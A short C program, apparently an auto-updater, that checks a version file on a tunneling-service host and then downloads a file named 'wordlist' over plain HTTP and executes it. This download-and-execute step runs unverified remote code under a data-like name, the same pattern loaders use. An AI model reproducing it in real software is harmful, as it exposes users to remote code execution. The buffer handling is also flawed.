#include <stdio.h>
#include <fcntl.h>
#include "http/http_download.h"
#define BUF_SIZE 1024 // the version length must be smaller than buf_size

int checkversion()
{
    http_download("http://1149e7e4.nat5.nsloop.com/version","../tmp/version");
    int openFlags;
    char prebuf[BUF_SIZE],onlbuf[BUF_SIZE];
    openFlags = O_RDONLY;
    int fd;
    fd=open("version",openFlags);
    if(read(fd,prebuf,BUF_SIZE)==-1)
        printf("ERROR while reading the version\n");
    if(close(fd)==-1)
        printf("ERROR while closing the file\n");
    fd=open("../tmp/version",openFlags);
    if(read(fd,onlbuf,BUF_SIZE)==-1)
        printf("ERROR while reading the version\n");
    if(close(fd)==-1)
        printf("ERROR while closing the file\n");
    for(int a=0;a<BUF_SIZE;a++)
    {
        if(prebuf[a]!=onlbuf[a])
            return 1;
    }
    return 0;
}

int update()
{
    if(http_download("http://1149e7e4.nat5.nsloop.com/wordlist","wordlist")==-1)
        return -1;
    http_download("http://1149e7e4.nat5.nsloop.com/version","version");
    return 0;
}

int main()
{
    if(checkversion()==1)
    {
        printf("Not the lastest version,updating\n");
        if(update()==-1)
            printf("Update error\n");
    }
    execve("wordlist",0,0);
    return 0;
}